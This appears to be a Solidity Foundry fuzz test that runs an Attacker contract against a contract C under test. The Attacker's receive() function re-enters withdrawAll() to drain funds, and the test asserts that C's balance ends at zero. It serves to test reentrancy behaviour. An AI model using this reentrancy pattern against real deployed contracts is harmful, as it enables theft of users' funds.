pragma solidity ^0.8.0;
import {Test} from "forge-std/Test.sol";
import {C} from "../src/C_under_test.sol";

contract InvMutTest is Test {
    C c;
    Attacker attacker;

    function setUp() public {
        c = new C();
        attacker = new Attacker();
    }

    function testFuzz_property(uint256 amount) public {
        amount = bound(amount, 1 ether, 100 ether);
        vm.deal(address(this), amount);
        vm.prank(address(attacker));
        c.deposit{value: amount}();
        vm.deal(address(c), amount); // headroom so the buggy version's double-debit of `balance` does not underflow

        attacker.attack(c);

        assertTrue(address(c).balance == 0);
    }
}

contract Attacker {
    C target;
    bool reentered;

    function attack(C c) external {
        target = c;
        reentered = false;
        c.withdrawAll();
    }

    receive() external payable {
        if (!reentered) {
            reentered = true;
            target.withdrawAll();
        }
    }
}

